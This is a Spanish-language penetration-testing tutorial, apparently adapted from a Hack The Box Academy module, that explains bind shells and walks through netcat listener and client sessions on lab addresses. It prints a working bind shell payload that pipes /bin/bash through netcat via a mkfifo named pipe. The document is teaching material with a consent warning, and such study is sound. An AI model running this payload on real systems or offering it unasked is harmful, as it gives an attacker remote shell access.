
# Bind Shells

En muchos casos, trabajaremos para establecer un shell en un sistema en una red local o remota. Esto significa que buscaremos utilizar la aplicación de emulador de terminal en nuestro equipo de atacante para controlar el sistema remoto a través de su shell. Esto normalmente se hace mediante el uso de un  `Bind` y/o `Reverse` Shell

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a ganar acceso a distintos sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

***

## <mark style="color:purple;">¿Qué es un Bind Shell?</mark>

Con un Bind Shell, el sistema `OBJETIVO` tiene un listener iniciado y espera una conexión desde nuestro sistema `ATACANTE`.

### **Ejemplo**

![imagen](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

Como se ve en la imagen, nos conectaríamos directamente con la `dirección IP` y el `puerto` escuchando al objetivo. Puede haber muchos desafíos asociados con la obtención de un shell de esta manera. Éstos son algunos a considerar:

* Tendría que haber un `listener ya iniciado` en el objetivo.
* Si no hay ningún listener iniciado, necesitaríamos encontrar una manera de que esto suceda.
* Los administradores normalmente configuran reglas estrictas de firewall entrante y NAT (con implementación de PAT) en el borde de la red (de cara al público), por lo que ya necesitaríamos estar en la red interna.
* Los Firewalls del sistema operativo (en Windows y Linux) probablemente bloquearán la mayoría de las conexiones entrantes que no estén asociadas con aplicaciones confiables basadas en red.

Los firewalls del sistema operativo pueden ser problemáticos al establecer un shell, ya que debemos considerar las direcciones IP, los puertos y la herramienta en uso para que nuestra conexión funcione correctamente. En el ejemplo anterior, la aplicación utilizada para iniciar el oyente se llama [GNU Netcat](https://en.wikipedia.org/wiki/Netcat) . `Netcat`( `nc`) se considera nuestro `Swiss-Army Knife` ya que puede funcionar sobre sockets TCP, UDP y Unix. Es capaz de usar IPv4 e IPv6, abrir y escuchar en sockets, operar como proxy e incluso manejar la entrada y salida de texto. Usaríamos `nc` en el equipo de atacante como nuestro `cliente` y el objetivo sería el `servidor`.

Obtengamos una comprensión más profunda de esto practicando con Netcat y estableciendo una conexión Bind Shell con un host en la misma red sin restricciones.

***

## <mark style="color:purple;">Practicando con Netcat</mark>

En este escenario, interactuaremos con un sistema Ubuntu Linux para comprender la naturaleza de un Bind Shell. Para hacer esto, usaremos `netcat`( `nc`) en el cliente y el servidor.

Una vez conectado al objetivo con ssh, inicie un oyente Netcat:

### **No. 1: Servidor - Objetivo que inicia el listener de Netcat**

```bash
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

En este caso, el objetivo será nuestro servidor y el equipo de ataque será nuestro cliente. Una vez que presionamos Enter, el listener se inicia y espera una conexión del cliente.

De vuelta en el cliente (equipo de ataque), usaremos `nc` para conectarnos al oyente que iniciamos en el servidor.

### **No. 2: Cliente: El atacante se conecta al objetivo**

```bash
afsh4ck$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Observe cómo estamos usando `nc` en el cliente y el servidor. En el lado del cliente, especificamos la dirección IP del servidor y el puerto que configuramos para escuchar ( `7777`). Una vez que nos conectamos exitosamente, podemos ver un mensaje `succeeded!` en el cliente como se muestra arriba y un mensaje `received!` en el servidor, como se ve a continuación.

### **No. 3: Servidor: Objetivo que recibe la conexión del cliente**

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!    
```

Sepa que este no es un shell adecuado. Es solo una sesión TCP de Netcat que hemos establecido. Podemos ver su funcionalidad escribiendo un mensaje simple en el lado del cliente y viéndolo recibido en el lado del servidor.

### **No. 4: Cliente - Atacante enviando un mensaje Hola**

```bash
afsh4ck$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hola  
```

Una vez que escribamos el mensaje y presionemos Intro, notaremos que el mensaje se recibe en el lado del servidor.

### **No. 5: Servidor: Objetivo que recibe el mensaje Hola**

```shell-session
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hola 
```

***

## <mark style="color:purple;">Bind Shell básico con Netcat</mark>

Hemos demostrado que podemos usar Netcat para enviar texto entre el cliente y el servidor, pero este no es un shell de enlace porque no podemos interactuar con el sistema operativo ni con el sistema de archivos. Sólo podemos pasar texto dentro de la configuración de canalización mediante Netcat. Usemos Netcat para servir nuestro shell y establecer un shell de enlace real.

En el lado del servidor, necesitaremos especificar el directorio, el shell, el listener, trabajar con algunas canalizaciones y la redirección de entrada y salida para garantizar que se proporcione un shell al sistema cuando el cliente intente conectarse.

### **No. 1: Servidor:Vincular un shell Bash a la sesión TCP**

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

Los comandos anteriores se consideran nuestra carga útil y la entregamos manualmente. Notaremos que los comandos y el código de nuestras cargas útiles diferirán según el sistema operativo host al que los entreguemos.

De vuelta en el cliente, usamos Netcat para conectarnos al servidor ahora que se está sirviendo un shell en el servidor.

### **No. 2: Cliente: Conexión para vincular el shell en el objetivo**

```bash
afsh4ck@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```

Notaremos que hemos establecido exitosamente una sesión de shell de enlace con el objetivo. Tenga en cuenta que teníamos control total tanto sobre nuestro cuadro de ataque como sobre el sistema objetivo en este escenario, lo cual no es típico. Trabajamos a través de estos ejercicios para comprender los conceptos básicos del bind shell y cómo funciona sin ningún control de seguridad (enrutadores habilitados para NAT, firewalls de hardware, firewalls de aplicaciones web, IDS, IPS, firewalls de SO, protección de endpoints, mecanismos de autenticación, etc.). ) en su lugar o exploits necesarios. Esta comprensión fundamental será útil a medida que nos adentremos en situaciones más desafiantes y escenarios realistas trabajando con sistemas vulnerables.

Como se mencionó anteriormente en esta sección, también es bueno recordar que es mucho más fácil defenderse del bind shell. Dado que la conexión se recibirá entrante, es más probable que los firewalls la detecten y la bloqueen, incluso si se utilizan puertos estándar al iniciar un oyente. Hay formas de solucionar esto mediante el uso de un shell inverso que analizaremos en la siguiente sección.
